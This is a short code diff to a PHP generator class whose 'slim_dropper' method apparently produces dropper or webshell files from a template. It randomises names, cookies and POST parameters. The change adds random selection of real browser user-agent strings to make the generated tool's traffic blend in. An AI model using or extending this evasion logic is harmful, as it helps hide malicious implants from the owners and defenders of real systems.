@@ -6,13 +6,19 @@ const allowed_chars = alpha;
 
 class dynamic_generator
 {
+    private function randomized_user_agents(){
+        $user_agents = file("includes/agents/user_agents");
+        $choice = array_rand($user_agents);
+        return trim($user_agents[$choice]);
+
+    }
     function slim_dropper(string $caller, string $filename, bool $randomize)
     {
         if ($randomize === true && !empty($caller)) {
             if (empty($filename)) {
                 $filename = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
                 $cookieName = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
-                $randomized_ua = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
+                $randomized_ua = $this->randomized_user_agents()."(".bin2hex(openssl_random_pseudo_bytes(rand(5, 25))).")";
                 $post_variable = substr(allowed_chars, rand(0, 7), rand(1, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
                 $post_value = bin2hex(openssl_random_pseudo_bytes(rand(5, 25)));
                 $slim = file('includes/templates/base_template.php');
